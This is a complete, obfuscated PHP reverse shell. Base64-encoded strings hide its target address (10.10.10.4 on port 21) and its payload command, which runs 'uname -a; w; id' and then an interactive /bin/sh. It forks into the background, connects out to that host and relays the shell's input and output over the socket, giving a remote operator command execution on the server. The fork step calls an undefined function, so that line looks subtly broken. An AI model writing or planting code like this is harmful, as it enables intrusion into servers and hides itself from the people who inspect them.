<?php set_time_limit(0);$c1=base64_decode('MS4w');$l2=base64_decode('MTAuMTAuMTAuNA==');$z3=21;$e4=1400;$u5=null;$w6=null;$g7=base64_decode('dW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1p');$t8=0;$g9=0;if(function_exists(base64_decode('cGNudGxfZm9yaw=='))){$ua=ib();if($ua==-1){m0(base64_decode('RVJST1I6IENhbid0IGZvcms='));exit(1);}if($ua){exit(0);}if(posix_setsid()==-1){m0(base64_decode('RXJyb3I6IENhbid0IHNldHNpZCgp'));exit(1);}$t8=1;}else{m0(base64_decode('V0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwu'));}chdir(base64_decode('Lw=='));umask(0);$ac=fsockopen($l2,$z3,$jd,$ae,30);if(!$ac){m0("$ae ($jd)");exit(1);}$rf=array(0=>array(base64_decode('cGlwZQ=='),base64_decode('cg==')),1=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')),2=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')));$c10=proc_open($g7,$rf,$u11);if(!is_resource($c10)){m0(base64_decode('RVJST1I6IENhbid0IHNwYXduIHNoZWxs'));exit(1);}stream_set_blocking($u11[0],0);stream_set_blocking($u11[1],0);stream_set_blocking($u11[2],0);stream_set_blocking($ac,0);m0("Successfully opened reverse shell to $l2:$z3");while(1){if(feof($ac)){m0(base64_decode('RVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZA=='));break;}if(feof($u11[1])){m0(base64_decode('RVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZA=='));break;}$l12=array($ac,$u11[1],$u11[2]);$i13=stream_select($l12,$u5,$w6,null);if(in_array($ac,$l12)){if($g9)m0(base64_decode('U09DSyBSRUFE'));$j14=fread($ac,$e4);if($g9)m0("SOCK: $j14");fwrite($u11[0],$j14);}if(in_array($u11[1],$l12)){if($g9)m0(base64_decode('U1RET1VUIFJFQUQ='));$j14=fread($u11[1],$e4);if($g9)m0("STDOUT: $j14");fwrite($ac,$j14);}if(in_array($u11[2],$l12)){if($g9)m0(base64_decode('U1RERVJSIFJFQUQ='));$j14=fread($u11[2],$e4);if($g9)m0("STDERR: $j14");fwrite($ac,$j14);}}fclose($ac);fclose($u11[0]);fclose($u11[1]);fclose($u11[2]);proc_close($c10);function m0($g15){if(!$t8){print"$g15\n";}}?>
